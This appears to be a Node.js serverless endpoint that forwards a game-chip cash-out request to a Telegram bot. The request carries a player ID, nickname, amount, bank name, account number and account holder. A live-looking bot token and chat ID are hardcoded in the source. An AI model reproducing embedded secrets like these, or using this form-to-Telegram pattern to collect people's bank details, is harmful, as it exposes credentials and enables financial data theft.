// api/kirim-telegram.js
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ message: 'Method Not Allowed' });
    }

    const { id, nick, jumlah, bank, norek, nama } = req.body;
    const token = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw";
    const chat_id = "7614282744";

    const pesan = `🔔 *BONGKAR CHIP* 🔔\n\n🆔 ID: ${id}\n👤 Nick: ${nick}\n💰 Jumlah: ${jumlah}\n🏦 Bank: ${bank}\n💳 No Rek: ${norek}\n📛 Nama: ${nama}`;

    try {
        const telegramRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chat_id,
                text: pesan,
                parse_mode: 'Markdown'
            })
        });

        const result = await telegramRes.json();

        if (result.ok) {
            return res.status(200).json({ status: 'success', message: 'Terkirim!' });
        } else {
            return res.status(500).json({ status: 'error', message: 'Gagal kirim ke Telegram' });
        }
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
